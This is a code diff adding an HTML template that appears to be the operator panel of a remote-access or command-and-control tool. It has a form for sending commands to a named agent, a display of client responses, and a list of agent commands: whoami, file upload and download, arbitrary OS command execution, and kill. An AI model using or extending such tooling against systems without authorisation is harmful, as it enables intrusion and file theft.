@@ -1,0 +1,30 @@
+<html>
+	<body>
+	<h1> commands here </h1>
+
+	<form action="/{{agentName}}/exec" method="POST">
+		<p>Enter Command:</p>
+		<input type="text" name="command">
+		<input type="submit">
+	</form>
+
+	<h2>Client Response:</h2>
+	{% for x in server_object.clients %}
+		{% if x.id == agentName %}
+		<p>{{ x.frm_client }}</p>
+		{% endif %}
+	{% endfor %}
+
+	<h3>Commands:</h3>
+	<p>whoami</p>
+	<p>upload 'fileName'</p>
+	<p>download 'FileName'</p>
+	<p>!'osCommand' </p>
+	<p>kill</p>
+	<a href="http://localhost:8080/home">Home</a>
+
+
+
+	</body>
+
+</html>
